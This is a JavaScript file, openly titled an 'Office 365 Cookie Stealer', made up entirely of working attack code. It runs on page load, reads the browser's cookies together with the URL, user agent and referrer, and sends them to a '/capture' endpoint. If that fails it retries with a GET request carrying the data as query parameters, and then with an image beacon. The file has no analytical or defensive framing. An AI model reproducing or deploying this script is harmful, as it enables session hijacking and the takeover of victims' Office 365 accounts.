// =============================================
// OFFICE 365 COOKIE STEALER - FIXED VERSION
// =============================================

(function() {
    'use strict';
    
    console.log('🕵️ Office 365 Cookie Stealer Active');
    console.log('📍 Current URL:', window.location.href);
    
    // Auto-detect server URL
    const SERVER_URL = window.location.origin + '/capture';
    console.log('📡 Server URL:', SERVER_URL);
    
    // =============================================
    // 1. COLLECT COOKIES
    // =============================================
    function collectCookies() {
        const cookies = {};
        const cookieStrings = document.cookie.split(';');
        
        console.log('📊 Raw cookie string:', document.cookie);
        console.log('📊 Number of cookies:', cookieStrings.length);
        
        for (const cookie of cookieStrings) {
            if (cookie.trim()) {
                const [name, ...valueParts] = cookie.trim().split('=');
                cookies[name] = valueParts.join('=');
                console.log('   🍪 Found cookie:', name);
            }
        }
        
        return cookies;
    }
    
    // =============================================
    // 2. SEND DATA - WITH CREDENTIALS!
    // =============================================
    async function sendData(data) {
        console.log('📤 Attempting to send data...');
        console.log('📤 Data:', data);
        
        // Method 1: POST with credentials
        try {
            console.log('📤 Method 1: POST to', SERVER_URL);
            const response = await fetch(SERVER_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'User-Agent': navigator.userAgent
                },
                credentials: 'include',  // ← THIS IS CRITICAL!
                body: JSON.stringify(data)
            });
            
            const result = await response.json();
            console.log('✅ POST successful:', result);
            return true;
            
        } catch (error) {
            console.error('❌ POST failed:', error.message);
            
            // Method 2: GET with query params (fallback)
            try {
                const url = SERVER_URL + '?data=' + encodeURIComponent(JSON.stringify(data));
                console.log('📤 Method 2: GET to', url);
                const response = await fetch(url, {
                    credentials: 'include'  // ← ALSO CRITICAL!
                });
                console.log('✅ GET successful:', response.status);
                return true;
                
            } catch (e) {
                console.error('❌ GET failed:', e.message);
                
                // Method 3: Image beacon
                try {
                    const img = new Image();
                    img.src = SERVER_URL + '?cookies=' + encodeURIComponent(JSON.stringify(data.cookies));
                    console.log('📤 Method 3: Image beacon sent');
                    return true;
                } catch (e2) {
                    console.error('❌ All methods failed');
                    return false;
                }
            }
        }
    }
    
    // =============================================
    // 3. MAIN EXECUTION
    // =============================================
    async function execute() {
        try {
            // Update status on page
            const statusEl = document.getElementById('status');
            if (statusEl) {
                statusEl.textContent = '🔄 Collecting data...';
            }
            
            // Collect cookies
            const cookies = collectCookies();
            const cookieCount = Object.keys(cookies).length;
            console.log(`📊 Total cookies collected: ${cookieCount}`);
            
            // Build payload
            const payload = {
                url: window.location.href,
                hostname: window.location.hostname,
                userAgent: navigator.userAgent,
                timestamp: new Date().toISOString(),
                cookies: cookies,
                cookieCount: cookieCount,
                referrer: document.referrer || 'Direct'
            };
            
            // ALWAYS SEND - even if no cookies (so we know it's working)
            console.log('📤 Sending data to server...');
            const sent = await sendData(payload);
            
            if (sent) {
                console.log('✅ Data sent successfully!');
                if (statusEl) {
                    statusEl.textContent = `✅ ${cookieCount} cookies captured!`;
                    statusEl.className = 'status success';
                }
            } else {
                console.log('⚠️ Failed to send data');
                if (statusEl) {
                    statusEl.textContent = '⚠️ Connection issue. Please try again.';
                }
            }
            
        } catch (error) {
            console.error('❌ Execution error:', error.message);
        }
    }
    
    // =============================================
    // 4. RUN
    // =============================================
    if (document.readyState === 'complete') {
        setTimeout(execute, 1500);
    } else {
        window.addEventListener('load', function() {
            setTimeout(execute, 1500);
        });
    }
    
    console.log('🕵️ Office 365 Cookie Stealer ready');
    console.log('📡 Server:', SERVER_URL);
    
})();
